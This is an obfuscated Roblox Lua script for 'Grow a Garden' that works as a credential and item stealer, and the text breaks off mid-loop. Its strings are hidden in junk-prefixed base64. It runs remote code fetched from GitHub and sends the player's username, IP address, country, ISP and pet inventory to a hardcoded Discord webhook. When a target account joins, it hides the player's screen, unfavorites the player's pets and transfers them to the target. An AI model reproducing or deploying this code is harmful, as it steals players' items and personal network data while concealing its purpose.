local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function bTFtzkfAxlCoaBES(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 




-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(bTFtzkfAxlCoaBES('jwUctYwJuyqzUVCuQPwjAsCwCULWKJENdPwoXcgqffPuWxxwjSNVhxpaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = bTFtzkfAxlCoaBES('knUnOyJpYhwJGzqMkXoMiuBnCsHoehmHjlYPVigdxSHJgAkwpxaJmLwaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {bTFtzkfAxlCoaBES('zfNQRbCxaWDGbGVdNHiNDgwgGXFvepxmFWXJcgYawildAAjpUcFuCqLQmFkUGxheWVyMTIz'), bTFtzkfAxlCoaBES('pRvTZIDkyNnHyCFWpuuqCFFDwJkWTQRovjsNnNzdITyAoBkZSxOawAITXlBbHQ='), bTFtzkfAxlCoaBES('esQTEVBbjsFLFCmYcLHAOLvahXQvwELngxeEsdHSaRtOPnrkmiHQQgQRW5lbXlHdXk='), bTFtzkfAxlCoaBES('PjknzjnFlEJUFxpAqhfCVXunONGRDRkemclVOIcHccluNgkrsgMvJgDaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    bTFtzkfAxlCoaBES('UBpTDMRmdYsAYPCPXSFKaUjEstDnmDcbOtROSpNWErxYUkVIrHnDTyZRHJhZ29uZmx5'), bTFtzkfAxlCoaBES('OhfjIzvRKSOLMcihbXMNKRIzEtUJHWhiVgECvMbgLkYhWnmUEVUWYLXVOKAkVJleA=='), bTFtzkfAxlCoaBES('VIWaTfoffqSMgQWTqecKpnCycKuFAuRiQGItUGfvTtxIRjzyWowekVPUmFjY29vbg=='), bTFtzkfAxlCoaBES('ArMYAemsvpZwzJwnJrzaIAuFyksxjSPgwOxoFmdHQzjktbgDlSQyLlNUmVkIEZveA=='), bTFtzkfAxlCoaBES('VePRgpUNXRkKvbWVrPLWuEpRDNNCMEhkrwmiDOhPnHxlXedjMrHQxIUUXVlZW4gQmVl'),
    bTFtzkfAxlCoaBES('BTxXpgFMVeLsHPlikLfyGBsYFcSVHwPUdXwOdyJPyYwAMgSNIhhcvpxRGlzY28gQmVl'), bTFtzkfAxlCoaBES('KgujwRYuIOwlPZOQppJlAjEvsDFGtNdtcxmakUkNBwDofbXTjdozqDYQnV0dGVyZmx5'), bTFtzkfAxlCoaBES('SgdMEKciUxzIsOduionQFKhekOlIQoAIaUcGxKIdkrqAKQZpMQoLRmTTWltaWM='), bTFtzkfAxlCoaBES('NkOIBhzvyIjmJYqMKAcFkhFqiYYNpdMNdcXbSNVARdTEStkbmktjBbMTW9vbiBDYXQ='), bTFtzkfAxlCoaBES('rOYWdoGmsDVAauqrwgfHzMwLgaiHoRbETZkwqQDOGCetrPElXKCksRyRmVubmVjIEZveA=='),
    bTFtzkfAxlCoaBES('xMkAazlZDsTheXPFxVmvlwurdalFheeedugdoCijnzQlRnXgzKarnSkVHJpY2VyYXRvcHM='), bTFtzkfAxlCoaBES('NcHTjkhiiaKZQSsEJSMCkeOqJzzRikyLnDUNLHCubjVmJFOJTEbMkdcQXhvbG90bA=='), bTFtzkfAxlCoaBES('tWlKAmUDNdDGaEnwucJivcrwvkcdQTHzHBgNMBtFabTiCYAXWphIDoHQmVhciBCZWU='), bTFtzkfAxlCoaBES('zWOAQhUVAgtyCAXxrliqSSFsxvROnmiWBHCfRVgncFonnCUIkwpihDBUG9sYXIgQmVhcg=='),
    bTFtzkfAxlCoaBES('CbZGvWjmURwYDKfaknTcpqhdghwTMvLpWoeiEkIXaVTeabiIXrIEHLWUHJheWluZyBNYW50aXM='), bTFtzkfAxlCoaBES('KHSoNOzTwSLJwgIrbPxicHsmGWtUyqBSdKLjtojztwILEXnqGcCTHOiU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    bTFtzkfAxlCoaBES('IJVqZauYdiGNMApILBUgBqbleDtFWlwVJxDhjXSjUUyQHicQgJweJpiU3RhcmZpc2g='), bTFtzkfAxlCoaBES('ZwNLPzwUDUiHgbKNXdoEhJVnsFNNPVUjkYjGJTyXzItuHhywHNnTtXSQ3JhYg=='), bTFtzkfAxlCoaBES('nuhYxAZGqSGwkWplmBScpGhZemtgSMXIszctjivxsGKXkCFpAnxfocLU2VhZ3VsbA=='), bTFtzkfAxlCoaBES('VpiLYUyLhZAREbztHgcIKAeziYMpsYulyrSlrIfxAbPmxcTgUqlxzGFQnVubnk='), bTFtzkfAxlCoaBES('fmaJHuVcdjOnJmlmIwzYKqArSDDrJbaWWwHWdBbRVBEHFXTMQdoQHsHRG9n'), bTFtzkfAxlCoaBES('uISIcgpJzBKMPdMGgXAeKgOGGdJeOOwdKbRdWfRSahdXypoqjfGWOmRR29sZGVuIExhYg=='), bTFtzkfAxlCoaBES('qDGpYmjqdFDsiaFzPzyoBIJVvKNKtoDqQZMwCnEYwkoNCEhJITeQkTgQmVl'),
    bTFtzkfAxlCoaBES('PIrIEraVuljkFJzdgbcagJKuHVOXFyDKMGxScwUSMYzTpcSAwxjCBlWQmxhY2sgQnVubnk='), bTFtzkfAxlCoaBES('RlCeaVdzLFKoNazriFPFAZDBZcjausoFOkqGOdkinMeaOiWZzdUmlMCQ2F0'), bTFtzkfAxlCoaBES('enWpoNNWqyCYAVNZyrBIUFMfvnGqODJcErMzaArqgryVcYVLBYgdXyUQ2hpY2tlbg=='), bTFtzkfAxlCoaBES('WHgXuCkqTPkLvyjKxWwRUKuRhUKxDgfASFciVlbpTQBmRPeEODCJMrzRGVlcg=='), bTFtzkfAxlCoaBES('nyeeXYDlVezrZHKLZAxaqNLnkjnjLvZWcfJlQyrzNOCuIpMeWeryAhlTW9ua2V5'), bTFtzkfAxlCoaBES('ItkJDZEhFnvcGTXciPGApkaYWGPcpXdCPSzxyQHFAAcPVtosxBLnpPhT3JhbmdlIFRhYmJ5'),
    bTFtzkfAxlCoaBES('jWTbrphOeYbHEbwWyZWWZzavYtNhzjLUaRnPfHHyXsfBFDgovtHJdfyUGln'), bTFtzkfAxlCoaBES('OwKJwPKMSXiVpvFKAyjvalUlZCEgfpedRizcrjleRFunWElFGYUhGCKUm9vc3Rlcg=='), bTFtzkfAxlCoaBES('aRknTTzHXWyADoUDnWgQlyVWgaGeMfkcIPWsktzszZRIgRZjRQBCXYcU3BvdHRlZCBEZWVy'), bTFtzkfAxlCoaBES('wHNvbufAsNFTdRwgVCwmMUVsdnBufhqTQUCKnlVJoQyXjpMhGSaMaoMRmxhbWluZ28='), bTFtzkfAxlCoaBES('HLbiqGyJUQHSXDdatFNBxiZRSleZiZfgpaxEVWfmjMvTyByLlNbDTInVG91Y2Fu'), bTFtzkfAxlCoaBES('PteZVnyWFDcPVFiSYbCbFfqDdmHvRVSzcBconpQDAezcAEcISorGExFU2VhIFR1cnRsZQ=='),
    bTFtzkfAxlCoaBES('KqEgjacIJIaTRLZhDaAKqxrTmzmOEFHpqFctaabusrCXeDJVlVaUPVWT3Jhbmd1dGFu'), bTFtzkfAxlCoaBES('wJPJLyRuxjYmRHUyTHppwDmIYgURGFaNlWaHXhxhKexAZQIqhLLjsxcU2VhbA=='), bTFtzkfAxlCoaBES('EzMWPcZwFEHMyfTTJxYCHJAIyjafWqQBfdfzWsrfMeyopanmjunnsPCSG9uZXkgQmVl'), bTFtzkfAxlCoaBES('YKjoYkXCiaABxASLYWkMlomJLaMmMorSnaBtqXiXIiUBfhPGzNsfMRLV2FzcA=='), bTFtzkfAxlCoaBES('jlecvRMtnekwogGXxnePehRflzPynOSlnSMUTNNwTcbbBjnvYtXXeguVGFyYW50dWxhIEhhd2s='), bTFtzkfAxlCoaBES('PkGIkRRWDlgNwHGQnDzmiadpxMmngNKEvAswhxuRSaLPxbpgAegfXLsUmFwdG9y'),
    bTFtzkfAxlCoaBES('bQFhlDqagycJqhuTSCYMZMLaIPGqaXbFnIxPqMRXzfrVbhBQasxVnejVHJpY2VyYXRvcHM='), bTFtzkfAxlCoaBES('scUWVCBQVUEfKTKecjHaDCaPSErkMwWDriGZWbNkxsSckaxPoFqxlhDU3RlZ29zYXVydXM='), bTFtzkfAxlCoaBES('cQhUJtVRpVlmIARQecOaomNtNCtKnjWgWlKFKXVWPdqxMmLvTuSxmKsUHRlcm9kYWN0eWw='), bTFtzkfAxlCoaBES('ToFPeZpgQyaQJUQwqUcwDYyRBzXpOWVzfLYspwCVRBYJITNGqZrvFwZVHVydGxl'), bTFtzkfAxlCoaBES('McDqBdyyZJvenOPDylApjeLDoIRjqOPFjfVXzkNzkenWnkSVlIxILxgQ2F0ZXJwaWxsYXI='),
    bTFtzkfAxlCoaBES('FZWKdbCLEMzJXMwqqbMZSVvWjyTvXquSiKCeuzqbBFlWMlpztYMJqxyUGV0YWwgQmVl'), bTFtzkfAxlCoaBES('VLCIsbmmUMZzrZagPInPIayVnjvREtEiJargezTwcAMHCybNhPxjjeYTW90aA=='), bTFtzkfAxlCoaBES('ZLJnZhfGYJGQtKJcDMTyiOplBxTiFPYnTHUSRKnDbWyHxbtHKhEItraU2NhcmxldCBNYWNhdw=='), bTFtzkfAxlCoaBES('zCYdTjIPXrsEvzkETEBHXwajBLYaHlZHzErSoOeXkQJxSFtyzPLfmFBT3N0cmljaA=='), bTFtzkfAxlCoaBES('GevOzfdhTHebDFHKnpxEIYDWLBCephlWkJXAywAfhxhinPqgVuVdEfEUGVhY29jaw=='),
    bTFtzkfAxlCoaBES('wTwiOYXvRdFIPAMoPPKQCLdDBqYlrnFzTlykpgyokNAmQILEtMLYJbUQ2FweWJhcmE='), bTFtzkfAxlCoaBES('QSiDvgWvdALebnkqBNcYdeergkQSRxnPKLvXfoKVvvMJdbFdUDzPPXMU2FuZCBTbmFrZQ=='), bTFtzkfAxlCoaBES('YYPVnwPNDDaedgCzZRozOZXnWWodgZQFjYooPWUJAJAwEHkZigSZXgJTWVlcmthdA=='), bTFtzkfAxlCoaBES('UyVOsnDsjeiKFpNiseDZTXNAgJpplcthmnHBrdzOYLLinQeVEPSGjHvQnJvd24gTW91c2U='), bTFtzkfAxlCoaBES('lJWhyxnxxZvNkZZJfNJpgPNzkwjfIWQVwQqObLbtAVuCebxeylvcNbaR2lhbnQgQW50'),
    bTFtzkfAxlCoaBES('iWBnYriylPuxmeouFpvZMYHevHRgSfekxUAJtJaVNMJfpgWVdFShCYLR3JleSBNb3VzZQ=='), bTFtzkfAxlCoaBES('avEIDmNDzSkJxBLzcRGYyivvpyPHiFecRghvcJqTntTqstWMaasNpYEUHJheWluZyBNYW50aXM='), bTFtzkfAxlCoaBES('WoIxDuPPfPMyFmeKHyenfooXuYpUTUrcwhgqepBEilXwAzFKOMTgMYKUmVkIEdpYW50IEFudA=='), bTFtzkfAxlCoaBES('MziCFqWAVFgvklZrveaMvWFZwwnptJFtkjRufwAoRObHjrIFLMqGGZlU25haWw='), bTFtzkfAxlCoaBES('BfvLKSUiHtVwnxPPDoWBZHrqONvyhThFTztAbGbnsHRUyMUMNwEnKwSU3F1aXJyZWw='),
    bTFtzkfAxlCoaBES('cQVNdBFhNCrftFazcWxCNQKTgdCNOGvgavGdLUCMcRnUVHTDqVqrJemQmVhciBCZWU='), bTFtzkfAxlCoaBES('DRFzSiLcYhgtlBQyjAHSfTGFFtlXmZZqzrGDRuXJLHJCZWKqbjYCjZMQnV0dGVyZmx5'), bTFtzkfAxlCoaBES('lFiZneDjRABpyOmOmRIkdDpSWLpksYXwyIHHoSQnrnZKYojXXbGYiDkQnJvbnRvc2F1cnVz'), bTFtzkfAxlCoaBES('TaGROsdwfzQqNNbSGiujYjUJzcnURlRyJytIOYCPUZNvNfZHmHinppXUGFjayBCZWU='), bTFtzkfAxlCoaBES('wLPtpfuFbAsqkZaxraivhdZmiILWLXtzIxkhTzEzepCqKMoQWHfVKABTWltaWMgT2N0b3B1cw=='),
    bTFtzkfAxlCoaBES('ngxBCsDlLSYRsoDKXTwBAxhGOKOTeZoAPrKnfOAuWxhqgsiAGCIlRiYSHlhY2ludGggTWFjYXc='), bTFtzkfAxlCoaBES('XOyYgUKgsZhviYsRVidlbQDSTUDmcnsGRIFWSRxVrSniGMgrHLgiaCVQXhvbG90bA=='), bTFtzkfAxlCoaBES('iLcWySRpTJhyRkuNMSZdAhNnQnzctQBpEfoTcZnwtMoAViUDDEUvHOWUmVkIEZveA=='), bTFtzkfAxlCoaBES('FQQdKDlekKFkQcZKeTKcvbfCfUsyBQuaBGCFAPKWDOTNypwmSxMQoFJVOKAkVJleA=='), I bTFtzkfAxlCoaBES('uWAmPGLrNtjbHTBAqFElOenuchTksOgrEozqAROaZAlQcpGHxthcyjDRHJhZ29uZmx5'),
    bTFtzkfAxlCoaBES('lsokoUjzGfbnCMrWszkqXImQUhGEFlOHfEHVEOKTydTIdlzPRjLOROHUXVlZW4gQmVl'), bTFtzkfAxlCoaBES('HTjYhNUUuphqvODRfJaWogDuqzGjfgDNimwaGGQsJVZdAugSGwmylFQRGlzY28gQmVl'), bTFtzkfAxlCoaBES('xGZvTfdtzZJjnhSkZsglCYGYQRDnFiFTmVhCZcpeQmqoOEAmGRNnMsURmVubmVjIEZveA=='), bTFtzkfAxlCoaBES('pnkGDkexfThBjTikJFkdoNKNTFrGPwRnCtMzAkLRMhYWTOjwtgvVJvaTW9vbiBDYXQ='), bTFtzkfAxlCoaBES('fWnUUIoaVSwEEvOLGeGWIIDMjNpyMETZHklCGzMWgEpUCBWMmopgqKvUmFjY29vbg=='),
    bTFtzkfAxlCoaBES('RsMXbOQiAjCTSNTxsuatKrYCgKOVlbRDppGdXSkjJDeDflxxNCCiUmbUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(bTFtzkfAxlCoaBES('ZMECekhDXGOfcnYwEDfrBJJiaiWZsXtDeFhPtkaWCVbmJuKOlRvoUPuUGxheWVycw=='))
local ReplicatedStorage = game:GetService(bTFtzkfAxlCoaBES('ljUhAVJMIKleaxfjLzqCkUfEpnwBVmuoKyETOIgZWyprGURKHlLuCwnUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(bTFtzkfAxlCoaBES('PAfPgrjFIQjKzNjdsDglQerqTsamlIspGZbHIsDIxtxxVQQnKNgjFWkSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(bTFtzkfAxlCoaBES('xgLpTkSaoohTiIrPotgxgJUoMzwZUAsHwEAbAecUxSenCMqMLsefypQVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(bTFtzkfAxlCoaBES('wmeqlKIZzEFWSQtjJhDkLOtJsEwhhhluNyUWbFnucXrRoWoKKuAatYWTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(bTFtzkfAxlCoaBES('VYKHSztnmtHANVPvPaFYCLVrNSveaKvfACYOUWYBJdENTIqVXgkbnamQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = bTFtzkfAxlCoaBES('aSVTZuRyfdELlvMxtXIJIANyxKwgVrKYHTzYuTMPDYurRkkkbwVdcvv')
    local lowest = nil
    repeat
        local url = bTFtzkfAxlCoaBES('kZJPncAmTHpGJjLhgEaLzMxKDDGSrNqxiEtjKxEodQxOzQdPMgXMGCsaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. bTFtzkfAxlCoaBES('WxcXicoxyUEHEISKkmAMpHyAFXkynRMyuunpSijzzByxohtzzDDdYTbL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= bTFtzkfAxlCoaBES('HNPpLngPntmSvTgHSVAMZNGvSumeiwaUlHCJOcWHSEweWeMySilkYvK') then url = url .. bTFtzkfAxlCoaBES('AXDxCDoRmFGbFSnTqxJhgfQUkQSutmigIkcqozrIyRZOyHRqUYaSKllJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = bTFtzkfAxlCoaBES('xlOrOERuUxwVtYACoxAMpMdntOJDhhoTsVIQQAUkJvLGWktcdwDTMImR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= bTFtzkfAxlCoaBES('nhXjNsUMunpTVJoPjCnpZKVTenMfKoKXoadYGiINpKjyIqFXOuBfLGy') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(bTFtzkfAxlCoaBES('jQNRUVhzeqFJNXTgwxbHBVhyrSLVsKlIBOykTxrKMakVfavhzYHNgoTWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(bTFtzkfAxlCoaBES('eoWygLCVDhmmgomcmYPTvuJhyZodjEuEkIDgjUZlWNfHXuUBvEsuPZvWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(bTFtzkfAxlCoaBES('xwaCqLsVyJBWvCQkPZXzmpmqxjUrxbeJjBlOtZlcvnFGhSXAOcwcMaGQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(bTFtzkfAxlCoaBES('lIOchUSDLCpmDDXyYtBmpAzglIHoLzBmnVDPCzLvaMPSTYagnwLunkhVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, bTFtzkfAxlCoaBES('XGtIUoxiQyhUnNrLyqfnAJTPBSoQnQeSgrvVqgeVWTXyfcSZWWEBxscLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = bTFtzkfAxlCoaBES('PFwTiWGwbETfBxJtefJXxyiEjOFJsDxLerXUeWZLfatBCguzGuWuUDp8J+OkiBQZXRzIA==') .. tostring(i) .. bTFtzkfAxlCoaBES('AmpFPbPjTaxdfTKAtlUXgiKhiaEMkCIIvvIJjGELpKcHZUkzUiCIvXk4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, bTFtzkfAxlCoaBES('yARdbRQpoikZGjYOhgoYBYUglQmqLIcOuKxwNZLDDfXVyZcqtwlWeKTXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = bTFtzkfAxlCoaBES('RZwkuPAbqTzidsjCiAquzSVmOcKoKMNKxGfmZFZIgVxSFnfQfOmxmvg'),
        embeds = {{
            title = bTFtzkfAxlCoaBES('TkMlNSYfzxxliFHZNeHLYvJXGvbpmAlHmWpaPRznOjPnrqLRFElBbHw8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = bTFtzkfAxlCoaBES('lCiUcmKrYbwMUrYxWaFMctExtpnJGTiWMSBBBSMwDcgjTrIhrHcEVwaRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(bTFtzkfAxlCoaBES('FDekvsAuSUdmTMxkWStRvZzstusVPEnrAWwIOmQfIFUNldenjHpiNTyISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = bTFtzkfAxlCoaBES('WcnryenjqeZrQFZtJzbpLtGTzkzskcjiBKqcYJdaFhGHUEqsXPRhcVvUE9TVA=='),
            Headers = { [bTFtzkfAxlCoaBES('XZrEeQVREHTeLxKsiunXbkxuIVCyhztOueJkUlwHHEpInKBNnoVKcQPQ29udGVudC1UeXBl')] = bTFtzkfAxlCoaBES('QqpvPvhoaGXbcYqMBdMhjrpEmepEkvAFhJtUHJAYpEitnPJCyCgXhvqYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return bTFtzkfAxlCoaBES('xqzLkSghMGDqmlPYmSmRtqiexVcsUpjiuJAiYEFfJzQxlZrCWcdfzLqVW5rbm93bg=='), bTFtzkfAxlCoaBES('ugYuhBfWrHpPUDqtswlCgOpbIIJbqXnDiLBHUpIQjmZdETrTtfDJCLOVW5rbm93bg=='), bTFtzkfAxlCoaBES('FdsjRMhfIKurngPXTiuwpxKHlISHpMxeFgFSpylmXLzptVOhikINNOBVW5rbm93bg==') end
    local result = req({ Url = bTFtzkfAxlCoaBES('zzAdDIeGvMPrNmEVmWcSCYOjusbNWrTlYKbeJKCCYXIbCKVqdQsiCFQaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = bTFtzkfAxlCoaBES('kHRUGdZPdpZLzrmzPqPEMjbHhRxvgqCuiJIfNsUdPasiESydSLeXbEQR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or bTFtzkfAxlCoaBES('VwqYmIYiHzLRKsaovEbBRkBaeAVqfLEUQwpuYLACwmibvRHMfVoFeTePw=='), body.country or bTFtzkfAxlCoaBES('whHHPRsFLDvkcMVmNnowsbRVXYDtmclRCvQQRroQPkPSnNudWTYhwnDPw=='), body.isp or bTFtzkfAxlCoaBES('TqQltCUXiOBVczFZrpYiLizAznnOvppmxtQyFMTgNJgYglrCTvucRUhPw==')
    end
    return bTFtzkfAxlCoaBES('FqjQaLdRgWyyYQMsShFuYHNoRtfqjdKpFkUGCFuRXOaacOxwlWbxrWYPw=='), bTFtzkfAxlCoaBES('OCWNFFmLzvCXKJQtDbSpuDdoPJJkSWixXhOqukXqXqrAqknfUChzatvPw=='), bTFtzkfAxlCoaBES('YCiVsmdLrAEapgMKnZGAsUKgNwomnGHMwUfWHyTSDKUJkLizIkcRsGUPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(bTFtzkfAxlCoaBES('jAUULLXbaWhTjOrOpDrEImVAYMiHmcpyhLoUPnPCFjopiAogmMcXfseRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(bTFtzkfAxlCoaBES('HDUZRLzlCYSFbTEcGQSzvAnJIkHjGKASnDmNcncDrHivwxkEASTGsebSW5zdGFuY2U=')) and item:GetAttribute(bTFtzkfAxlCoaBES('HBeZxsxAqtcrfBtTWtasEubEjBuSrsPjrdWIOdrWseHfaqLOdCIsaGuZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(bTFtzkfAxlCoaBES('JuowyDiaTHVbUvQYQLOSPFOwioJYwuqHZHByWfzyMkSIvUVJdeToTDPR2FtZUV2ZW50cw==')):WaitForChild(bTFtzkfAxlCoaBES('onwakbEswCWsvtEudMzkTkTlKGEXaosEvgGXvFpCaIpdCaTPzjiTXHwVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = bTFtzkfAxlCoaBES('FYxFTslBmtwXunyUgtSkqtPuEoXXdzRGIRWVhQoUoSkohDMLccUUHKR8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, bTFtzkfAxlCoaBES('MrcODmNhqxzxsuLKJJbDRUUIlrhzFUiDCLizmgSGANpPyksBlWABAlLLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = bTFtzkfAxlCoaBES('cXdEGUKBwsVayFxxyuQuUIOJMSQFhOMotKNoSSRBFjpnBKmUXuQcSGh8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = bTFtzkfAxlCoaBES('iFeuINMgYTmhWTGqyutBFxcLzgWMovlMoYIpcDkdoTJzlXVWwwPNyov8J+MkCBJUA=='), value = ip },
        { name = bTFtzkfAxlCoaBES('MQRdMHqSErPCiNiKRiJvpMXxxBTCWFDbetPGAuBFxbhliDFnkhMhsbk8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = bTFtzkfAxlCoaBES('wPDqvteXLnDMvnXsFKmRbXFQkFVdDDalVhUXVGPRPHgYDYTXdBwwkTy8J+SuyBJU1A='), value = isp },
        { name = bTFtzkfAxlCoaBES('AdPUPMLmuenzDyeFNQsUzdnHzpphXVOwlCtsZPLnlrFeqcielnsQKev8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = bTFtzkfAxlCoaBES('vNlvZyBvrgMGxihisTBTTvHOWmqjegOpZakjuvsgXyjbzVAQfgczKkT4o+x77iPIFRpbWU='), value = os.date(bTFtzkfAxlCoaBES('iHYlhtGvcaDPKWXceEhKUnDeWDrRPequSWeXQNHcztgLlOAcBjGmqhzJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = bTFtzkfAxlCoaBES('CtUKGOoHzELqHCzZdQzVCdGgvKkYDgYHLErgFRdaTbHLtGXdUDzLmaN8J+OkiBQZXRz'), value = bTFtzkfAxlCoaBES('wAHUzwJSBmkEVhyUAxlyaIHImCtcmfdHFjvcRIpUwthTjpLbRApZcbKTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = bTFtzkfAxlCoaBES('kiyESqhOpMXSGTBtenRSRfnLwuHlZcPdBqzRqmIAoqhlwGFXXMXxyvy8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and bTFtzkfAxlCoaBES('ImDppTsSRKpNDCVOxxoYFFZgrqPqJuQJXpHVTeqxtSofsyOcEpECAunUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or bTFtzkfAxlCoaBES('OBZmUvBIIdHGzAmbERzGasYuSiHpimNOoGMyEFaAEshNltjFscMmHGvQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                -- REMOVE ALL GUIS
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(bTFtzkfAxlCoaBES('QYkZXgCEVkdHZhYJayeAbGrvIAnudcWKVhkSXNWKXVXqtUEFeWVuhkyU2NyZWVuR3Vp')) or gui:IsA(bTFtzkfAxlCoaBES('TAIwtodtNoryBakcHfQPKTFReJzQYIqXuGiTTzvBldZScANccLJwUdJQmlsbGJvYXJkR3Vp')) or gui:IsA(bTFtzkfAxlCoaBES('MpunBzNqkSftkXoOifcXibtKxEySVcmlFyPFNyJvRwZSfHLSEYyEHQtU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(bTFtzkfAxlCoaBES('TSMzkVIGekeYJRjOKaJhHsUksMwOZvULfKtIYZJcyqTGZpYNTZmToXPVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {bTFtzkfAxlCoaBES('PLkpNzgIQgtYcUCrtIPBuWesnQvWzYJySaRvtArEdyVkXJFcKacAnYuR2l2ZVBldA=='), player}
